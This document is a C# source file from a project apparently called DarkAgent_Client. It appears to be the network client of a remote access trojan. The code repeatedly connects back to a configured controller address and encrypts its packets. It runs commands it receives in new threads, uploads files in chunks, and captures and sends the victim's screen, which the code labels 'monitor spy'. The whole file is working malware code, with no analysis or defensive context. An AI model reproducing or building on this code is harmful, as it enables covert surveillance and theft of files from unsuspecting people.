using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using DarkAgent_Client.src.Objects;
using System.Drawing;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;
using DarkAgent_Client.src.Network.DataNetwork.Packets;
using DarkAgent_Client.src.Engines;
using System.Net;
using DarkAgent_Client.src.Utils;
using System.IO;
using System.Threading;

namespace DarkAgent_Client.src.Network.DataNetwork
{
    public class ClientConnect
    {
        public static Socket _client;
        private static byte[] _buffer;
        public SortedList<int, FileTransfer> fileTransfer;
        public Bitmap PrevImage;
        private bool SendnextRemoteImage = true;
        public bool EnableRemoteControl;

        public ClientConnect()
        {
            fileTransfer = new SortedList<int, FileTransfer>();
            TryToConnect();
        }

        private void Read()
        {
            _buffer = new byte[2];
            _client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, Client_BeginReceive, null);
        }

        private void Client_BeginReceive(IAsyncResult ar)
        {
            try
            {
                _buffer = new byte[BitConverter.ToInt16(_buffer, 0) - 2];
                if(_buffer.Length > 65000) //65kb
                {
                    Disconnect();
                    return;
                }
                else if(_buffer.Length > 0)
                {
                    _client.BeginReceive(_buffer, 0, _buffer.Length, SocketFlags.Partial, Client_ReadCallback, null);
                    return;
                }
                else
                {
                    Disconnect();
                    return;
                }
            }
            catch
            {
            	Disconnect();
                return;
            }
        }

        private void Client_ReadCallback(IAsyncResult ar)
        {
            try
            {
                if (_client.EndReceive(ar) > 0)
                {
                    byte[] buff = new byte[_buffer.Length];
                    Array.Copy(_buffer, buff, _buffer.Length);
                    Read(); //Lets keep reading

                    if (buff.Length > 0)
                    {
                        //_client.Receive(buff, 0, buff.Length, SocketFlags.Partial);

                        buff = CryptEngine.Crypt(buff);

                        //Process the packet.
                        Type pck = ClientPacketProcessor.ProcessPacket(buff);
                        if (pck != null)
                        {
                            ReceiveBasePacket rbp = (ReceiveBasePacket)Activator.CreateInstance(pck, this, buff);
                            Thread pckRun = new Thread(rbp.Run);
                            pckRun.Start();
                        }
                        return;
                    }
                }
            }
            catch
            {
                if(!_client.Connected)
                    TryToConnect();
            }
        }

        private static void Disconnect()
        {
            _client.Disconnect(false);
        }

        private void TryToConnect()
        {
            _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            if (!_client.Connected)
            {
                while (!_client.Connected)
                {
                    System.Threading.Thread.Sleep(1000);
                    try
                    {
                        _client = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        _client.Connect(new IPEndPoint(IPAddress.Parse(Settings.ConnectIP), Settings.ConnectPort));
                    }
                    catch { }
                }
            }
            Read();
            SendPacket(new S_NewClient(this));
        }

        public void SendFile(FileTransfer info, byte[] FileBytes, S_FileTransferSendBegin.SendType type)
        {
            lock (this)
            {
                if (info.type == -1 && SendnextRemoteImage) //remote control
                {
                    SendPacket(new S_FileTransferSendBegin(this, info, type));
                    Thread thread = new Thread(new ParameterizedThreadStart(ThreadSendFile));
                    thread.Start(new object[] { info, FileBytes });
                }

                if (info.type == 0) //file manager
                {
                    SendPacket(new S_FileTransferSendBegin(this, info, type));
                    Thread thread = new Thread(new ParameterizedThreadStart(ThreadSendFile));
                    thread.Start(new object[] { info, FileBytes });
                }
            }
        }

        private void ThreadSendFile(object param)
        {
            try
            {
                lock (this)
                {
                    SendnextRemoteImage = false;
                    FileTransfer inf = (FileTransfer)((object[])param)[0];
                    byte[] FileBytes = (byte[])((object[])param)[1];
                    int Index = 0;

                    for (int i = 0; i < FileBytes.Length; i += 1024)
                    {
                        Thread.Sleep(250);
                        if (i + 1024 <= FileBytes.Length)
                        {
                            byte[] FilePiece = new byte[1024];
                            Array.Copy(FileBytes, i, FilePiece, 0, 1024);
                            SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                            Console.WriteLine("Uploading file size: " + FilePiece.Length + ", index: " + Index);
                        }
                        else
                        {
                            byte[] FilePiece = new byte[FileBytes.Length - i];
                            Array.Copy(FileBytes, i, FilePiece, 0, FileBytes.Length - i);
                            SendPacket(new S_FileTransferSend(this, inf, FilePiece, Index));
                            Console.WriteLine("Uploading file size: " + FilePiece.Length + ", index: " + Index);
                        }
                        Index++;
                    }
                    //Thread.Sleep(10);
                    //SendPacket(new S_FileTransferSendComplete(this, inf));
                    SendnextRemoteImage = true;
                }
            }
            catch
            {
                throw new Exception("wtf");
            }
        }

        public void SendRemoteScreen()
        {
            byte[] ScreenBytes;
            FileTransfer info = new FileTransfer();
            info.type = -1; //-1 = monitor spy

            //while (EnableRemoteControl)
            //{
                try
                {
                    //Thread.Sleep(1000 / 30); //30fps is max speed we can get...
                    ScreenBytes = ScreenCapture.BitmapToBytes(ScreenCapture.CaptureScreen());
                    info.FileSize = ScreenBytes.Length;
                    SendFile(info, ScreenBytes, S_FileTransferSendBegin.SendType.MonitorSpy);
                    ScreenBytes = new byte[] {};
                }
                catch { }
            //}
        }

        public void SendPacket(SendBasePacket packet)
        {
            lock(this)
            {
                packet.Write();
                byte[] pck = CryptEngine.Crypt(packet.ToByteArray());

                List<Byte> FullPacket = new List<Byte>();
                FullPacket.AddRange(BitConverter.GetBytes((short)(pck.Length + 2))); //+2 Packet Length
                FullPacket.AddRange(pck); //Packet
                try
                {
                    _client.BeginSend(FullPacket.ToArray(), 0, FullPacket.ToArray().Length, SocketFlags.Partial, SendPacketCallback, null);
                } catch {}
            }
        }

        private void SendPacketCallback(IAsyncResult ar)
        {
            _client.EndSend(ar);
        }
    }
}
